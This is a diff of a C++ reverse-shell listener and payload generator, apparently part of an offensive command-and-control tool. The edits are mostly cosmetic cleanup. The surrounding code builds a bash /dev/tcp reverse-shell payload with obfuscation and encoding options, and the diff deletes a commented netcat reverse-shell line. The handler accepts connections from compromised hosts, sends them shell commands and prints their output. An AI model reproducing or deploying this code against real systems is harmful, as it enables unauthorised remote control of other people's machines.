@@ -299,9 +299,6 @@ void scriptCliCmd(std::string cmd)
 
     while (pos != -1)
     {
-        // std::cout << "[+] Start :: " << start << "\n";
-        // std::cout << "[+] POS :: " << pos << "\n";
-
         parsedFlags.push_back( cmd.substr(start, pos-start) );
 
         start = pos + 1;
@@ -475,10 +472,6 @@ void createShellScript(std::string targetOS, bool obf, bool enc, bool raw, std::
     } else
         {
             // Linux Shell Code
-
-            // nc rev shell
-            // /usr/bin/nc -e /bin/sh LHOST std::to_string(LPORT)
-
             if (shellType == "bash")
             {
                 codeContent += "/bin/bash -c '/bin/bash -i >& /dev/tcp/";
@@ -549,8 +542,6 @@ void BackgroundConnectionHandler()
     while (!serverShutDown)
     {
         // continously accept incoming connections
-
-        // std::cout << "[*] Created ShellConnection Object. . ." << "\n";
         sessions.push_back( ShellConnection(server_socket) );
         std::this_thread::sleep_for(std::chrono::seconds(1));
     }
@@ -682,19 +673,18 @@ void ShellInteraction()
 
 //=========== SEND SHELL COMMAND ========================================
 
-        shellcmd += '\n';// tells the shell connections EOC
+        shellcmd += '\n'; // tells the shell connections End-Of-Command
         const char* command = shellcmd.c_str();
 
         // send command to session
         bytes_sent = send(select_socket, command, strlen(command), 0);
-        if (bytes_sent == -1) {
+        if (bytes_sent == -1)
+        {
             // perror("send");
             close(select_socket);
             // close(server_socket);
             return;
         }
-
-        // Receive outstream from client
 
         // buffer clean-up
         buffer.clear();
@@ -715,9 +705,10 @@ void ShellInteraction()
         // buffer data on the terminal
         if (total_bytes_received > (ssize_t)shellcmd.length()) {
             std::cout << buffer.data() + shellcmd.length();
-        } else {
-            std::cout << "No output received." << std::endl;
-        }
+        } else
+            {
+                std::cout << "No output received." << std::endl;
+            }
     }
 };
 
@@ -808,7 +799,8 @@ void HandleServer()
         LHOST = beacon.getCentralHost();
 
         server_socket = socket(AF_INET, SOCK_STREAM, 0);
-        if (server_socket == -1) {
+        if (server_socket == -1)
+        {
             // perror("socket");
             throw(1);
         }
@@ -819,14 +811,16 @@ void HandleServer()
         server_address.sin_family = AF_INET;
         server_address.sin_addr.s_addr = INADDR_ANY;
         server_address.sin_port = htons(LPORT);
-        if (bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address)) == -1) {
+        if (bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address)) == -1)
+        {
             // perror("bind");
             close(server_socket);
             throw(2);
         }
 
         // Listen for incoming connections
-        if (listen(server_socket, 1) == -1) {
+        if (listen(server_socket, 1) == -1)
+        {
             // perror("listen");
             close(server_socket);
             throw(3);
@@ -867,18 +861,13 @@ void BackgroundInitListener()
 
     // Receive init outstream from client
     bytes_received = recv(select_socket, buffer.data(), buffer.size(), 0);
-    if (bytes_received == -1) {
-        // perror("recv");
+    if (bytes_received == -1)
+    {
         close(select_socket);
-        // close(server_socket);
-    } else if (bytes_received == 0) {
-        std::cout << "Client disconnected." << std::endl;
-    }
-    /*
-    else {
-        std::cout << buffer.data();
-    }
-    */
+    } else if (bytes_received == 0)
+        {
+            std::cout << "Client disconnected." << std::endl;
+        }
 };
 
 int ShellCheck()
@@ -896,12 +885,8 @@ int ShellCheck()
         bytes_sent = send(select_socket, command, sizeof(command), 0);
         if (bytes_sent == -1)
         {
-            // perror("send");
-            // close(select_socket);
             return 1;
         }
-
-        // Receive outstream from client
 
         // buffer clean-up
         buffer.clear();
@@ -924,8 +909,6 @@ int ShellCheck()
         // output the response to terminal
         if (total_bytes_received > (ssize_t)strlen(command))
         {
-            // std::cout << "[*] Displaying Buffer Data :: ShellCheck()\n";
-            // std::cout << buffer.data() + strlen(command);
             return 0;
         } else
             {
